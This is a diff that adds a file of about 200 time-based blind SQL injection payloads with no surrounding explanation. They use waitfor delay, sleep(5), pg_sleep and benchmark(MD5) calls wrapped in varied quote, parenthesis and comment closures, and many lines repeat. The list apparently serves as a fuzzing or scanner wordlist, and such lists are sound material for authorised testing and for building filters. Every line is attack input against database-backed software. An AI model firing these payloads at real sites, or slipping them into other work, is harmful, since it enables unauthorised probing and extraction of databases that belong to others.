@@ -1,0 +1,200 @@
+waitfor delay '0:0:5' and    (    (   'nvqf'  =  'nvqf
+1%'   )    )    and sleep  (  5  )  #
+1  )   where 4600  =  4600 or sleep  (  5  )  --
+1' waitfor delay '0:0:5'
+1  )   rlike sleep  (  5  )   and   (  5724  =  5724
+1%' rlike sleep  (  5  )   and '%'  =  '
+1' and sleep  (  5  ) 
+1' or elt  (  5873  =  5873,sleep  (  5   )    )   #
+or sleep  (  __TIME__  )    =  '
+1%'   )    )     )   waitfor delay '0:0:5'--
+waitfor delay '0:0:5' and   (  "ludp" like "ludp
+waitfor delay '0:0:5' and    (    (   "ykgm"  =  "ykgm
+1  )   waitfor delay '0:0:5' and   (  2993  =  2993
+1%' rlike sleep  (  5  )  #
+waitfor delay '0:0:5' and    (    (     (  8981  =  8981
+1  )   where 8320  =  8320 waitfor delay '0:0:5'--
+1'  )   as jztg where 1222  =  1222 or sleep  (  5  )  #
+1  )   rlike sleep  (  5  )  #
+1%" rlike sleep  (  5  )  #
+1 and sleep  (  5  )  #
+1'   )    )     )   waitfor delay '0:0:5'--
+1'  )   or sleep  (  5  )   and   (  'mdmr' like 'mdmr
+1 rlike sleep  (  5  )  -- muhp
+waitfor delay '0:0:5' and   (  "dmcu"  =  "dmcu
+1' where 9003  =  9003 waitfor delay '0:0:5'--
+or sleep  (  __TIME__  )  #
+1' or sleep  (  5  )   and 'udqz'  =  'udqz
+1%"   )    )     )   rlike sleep  (  5  )  #
+select pg_sleep  (  5  )   and    (    (   '%'  =  '
+1"   )    )     )   rlike sleep  (  5  )  #
+1 where 7224  =  7224 and sleep  (  5  )  #
+1%" waitfor delay '0:0:5' and "%"  =  "
+1'  )   rlike sleep  (  5  )  #
+1' where 6035  =  6035 waitfor delay '0:0:5'--
+select sleep  (  5  )   and    (    (     (  "%"  =  "
+1'   )    )     )   and sleep  (  5  )  #
+1"  )   where 6821  =  6821 waitfor delay '0:0:5'--
+1  )   and sleep  (  5  ) 
+select sleep  (  5  )   and   (  'vwmx'  =  'vwmx
+1' waitfor delay '0:0:5'--
+1'  )   or sleep  (  5  )   and   (  'fizk'  =  'fizk
+1  )   where 4600  =  4600 or sleep  (  5  )  --
+select sleep  (  5  )   and    (    (   "vzye"  =  "vzye
+select sleep  (  5   )    )   ||'
+1' where 5455  =  5455 and sleep  (  5  )  --
+1'   )    )    rlike sleep  (  5  )  #
+1' or sleep  (  5  ) 
+1%' or sleep  (  5  )  #
+1" waitfor delay '0:0:5'--
+1" where 7739  =  7739 and sleep  (  5  )  --
+"  )   or sleep  (  __TIME__  )    =  "
+" or sleep  (  __TIME__  )    =  "
+waitfor delay '0:0:5' and    (    (   'nvqf'  =  'nvqf
+select sleep  (  5  )   and   (  'vwmx'  =  'vwmx
+1%' or elt  (  5873  =  5873,sleep  (  5   )    )   #
+select sleep  (  5  )   and   (  'vwmx'  =  'vwmx
+1  )   waitfor delay '0:0:5' and   (  2993  =  2993
+ )    )    or sleep  (  __TIME__  )    =  '
+1%"  )   rlike sleep  (  5  )  #
+1'  )   rlike sleep  (  5  ) 
+1" or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1%'   )    )    or sleep  (  5  )  #
+1%" waitfor delay '0:0:5' and "%"  =  "
+ )    )   ,waitfor delay '0:0:__TIME__'--
+1 waitfor delay '0:0:5'# opyp
+1'  )   waitfor delay '0:0:5' and   (  'peyv' like 'peyv
+1  )   where 7165  =  7165 and sleep  (  5  )  #
+1" where 7739  =  7739 and sleep  (  5  )  --
+waitfor delay '0:0:5' and   (  "dmcu"  =  "dmcu
+select sleep  (  5  )   and   (  4863  =  4863
+select sleep  (  5  )  --
+1  )   and sleep  (  5  )  #
+waitfor delay '0:0:5' and    (    (   '%'  =  '
+1  )   or sleep  (  __TIME__  )  #
+1%'  )   or sleep  (  5  )   and   (  '%'  =  '
+"  )   or pg_sleep  (  __TIME__  )  --
+ )  ,waitfor delay '0:0:__TIME__'--
+1' rlike sleep  (  5  )   and 'cugs'  =  'cugs
+1 and sleep  (  5  )  # qcyj
+1   )    )     )   and sleep  (  5  )  #
+1"  )   rlike sleep  (  5  )  #
+1' rlike sleep  (  5  )   and 'ojqz' like 'ojqz
+1 waitfor delay '0:0:5'# opyp
+select sleep  (  5  )   and   (  'vwmx'  =  'vwmx
+select sleep  (  5  )   and   (  "tlbj" like "tlbj
+1 or elt  (  6272  =  6272,sleep  (  5   )    )   
+1 rlike sleep  (  5  )  #
+1%"   )    )     )   or sleep  (  5  )  #
+select sleep  (  5  )   and   (  "tlbj" like "tlbj
+1 waitfor delay '0:0:5'--
+waitfor delay '0:0:5' and    (    (   'yjsp' like 'yjsp
+1%" waitfor delay '0:0:5'--
+waitfor delay '0:0:5' and   (  "%"  =  "
+1%" waitfor delay '0:0:5'--
+1  )   and sleep  (  5  ) 
+1%'   )    )    and sleep  (  5  )  #
+1' and sleep  (  5  ) 
+1  )   or sleep  (  __TIME__  )  #
+1  )   waitfor delay '0:0:5'--
+waitfor delay '0:0:5' and    (    (     (  '%'  =  '
+1'   )    )    rlike sleep  (  5  )  #
+1"  )   or sleep  (  5  )   and   (  "xgtk"  =  "xgtk
+1 or pg_sleep  (  __TIME__  )  --
+select sleep  (  5  )   and    (    (   "%"  =  "
+1"   )    )    or sleep  (  5  )  #
+select sleep  (  5  )  --
+select sleep  (  5  )   and 'beuk'  =  'beuk
+waitfor delay '0:0:5' and    (    (   7619  =  7619
+1" and sleep  (  5  )  #
+waitfor delay '0:0:5' and "%"  =  "
+select pg_sleep  (  5  )   and 'qfaz' like 'qfaz
+1' where 9708  =  9708 or sleep  (  5  )  --
+1' or sleep  (  5  )   and 'udqz'  =  'udqz
+select pg_sleep  (  5  )   and "ilyw" like "ilyw
+1  )   and sleep  (  5  )  #
+1%' and sleep  (  5  )  #
+select sleep  (  5  )   and   (  "tlbj" like "tlbj
+1   )    )    waitfor delay '0:0:5'--
+select pg_sleep  (  5  )   and '%'  =  '
+1"   )    )     )   or sleep  (  5  )  #
+,waitfor delay '0:0:__TIME__'--
+select pg_sleep  (  5  )   and   (  1044  =  1044
+1  )   waitfor delay '0:0:5'--
+select sleep  (  5  )   and   (  'qcsv'  =  'qcsv
+1"   )    )     )   waitfor delay '0:0:5'--
+"  )   or benchmark  (  10000000,MD5  (  1   )    )   #
+"  )   or benchmark  (  10000000,MD5  (  1   )    )   #
+"  )  ;waitfor delay '0:0:__TIME__'--
+1'  )   waitfor delay '0:0:5' and   (  'vtfs'  =  'vtfs
+1  )   and elt  (  1210  =  1210,sleep  (  5   )    )   
+select pg_sleep  (  5  )   and 'rpka'  =  'rpka
+1 where 7224  =  7224 and sleep  (  5  )  #
+1%" waitfor delay '0:0:5'--
+select pg_sleep  (  5  )   and   (  'aydg'  =  'aydg
+1'  )   or sleep  (  5  )   and   (  'mdmr' like 'mdmr
+1 or elt  (  5873  =  5873,sleep  (  5   )    )   #
+ select sleep  (  5  )   and   (  "tlbp"  =  "tlbp
+1" where 3227  =  3227 waitfor delay '0:0:5'--
+1"  )   where 6821  =  6821 waitfor delay '0:0:5'--
+1' where 9003  =  9003 waitfor delay '0:0:5'--
+waitfor delay '0:0:5' and    (    (     (  "%"  =  "
+1'  )   and sleep  (  5  )   and   (  'xecl' like 'xecl
+1" waitfor delay '0:0:5' and "syhx"  =  "syhx
+1'   )    )     )   rlike sleep  (  5  )  #
+1%"   )    )     )   rlike sleep  (  5  )  #
+1" waitfor delay '0:0:5' and "syhx"  =  "syhx
+"  )  ;waitfor delay '0:0:__TIME__'--
+1  )   rlike sleep  (  5  )  #
+select sleep  (  5  )   and   (  'dcys' like 'dcys
+1 waitfor delay '0:0:5'
+select sleep  (  5  )   and 'beuk'  =  'beuk
+ )    )    or sleep  (  __TIME__  )    =  '
+1 or sleep  (  5  )  #
+select pg_sleep  (  5  )   and   (  'vnss' like 'vnss
+1%"  )   or sleep  (  5  )  #
+1" where 3740  =  3740 rlike sleep  (  5  )  #
+1' rlike sleep  (  5  )   and 'cugs'  =  'cugs
+select pg_sleep  (  5  )   and "zhsc"  =  "zhsc
+1' or sleep  (  5  ) 
+1'  )   and sleep  (  5  )  #
+1  )   waitfor delay '0:0:5'--
+1%"   )    )     )   and sleep  (  5  )  #
+1' where 9003  =  9003 waitfor delay '0:0:5'--
+1  )   waitfor delay '0:0:5'--
+1 and sleep  (  5  )  -- ruuv
+1%'  )   rlike sleep  (  5  )   and   (  '%'  =  '
+1' rlike sleep  (  5  )   and 'gtfo'  =  'gtfo
+1 and sleep  (  5  ) 
+ )    )    or sleep  (  __TIME__  )    =  '
+1%'   )    )    waitfor delay '0:0:5'--
+1   )    )    waitfor delay '0:0:5'--
+select sleep  (  5  )   and '%'  =  '
+1%' or sleep  (  5  )  #
+1%" and sleep  (  5  )  #
+1'  )   waitfor delay '0:0:5' and   (  'peyv' like 'peyv
+select sleep  (  5  )   and   (  "innk"  =  "innk
+1'  )   as jztg where 1222  =  1222 or sleep  (  5  )  #
+waitfor delay '0:0:5' and    (    (   "zili" like "zili
+1' or sleep  (  5  )   and 'udqz'  =  'udqz
+1"  )   where 7588  =  7588 waitfor delay '0:0:5'--
+1%"  )   rlike sleep  (  5  )  #
+1 rlike sleep  (  5  ) 
+1" waitfor delay '0:0:5' and "syhx"  =  "syhx
+select sleep  (  5  )   and    (    (   'keoy'  =  'keoy
+1%'  )   waitfor delay '0:0:5'--
+1%'  )   waitfor delay '0:0:5'--
+1" and sleep  (  5  )   and "tdid" like "tdid
+select pg_sleep  (  5  )   and   (  "pjql" like "pjql
+select sleep  (  5  )   and   (  4863  =  4863
+ )   or sleep  (  __TIME__  )    =  '
+1' and sleep  (  5  ) 
+1 or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1 and sleep  (  5  )  #
+1' or sleep  (  5  )   and 'udqz'  =  'udqz
+1%'   )    )    waitfor delay '0:0:5'--
+1' where 8482  =  8482 or sleep  (  5  )  #
+1'  )   or sleep  (  5  )   and   (  'fizk'  =  'fizk
+waitfor delay '0:0:5' and 'dfzn'  =  'dfzn
+1%" and sleep  (  5  )   and "%"  =  "
+1"  )   and sleep  (  5  )  #
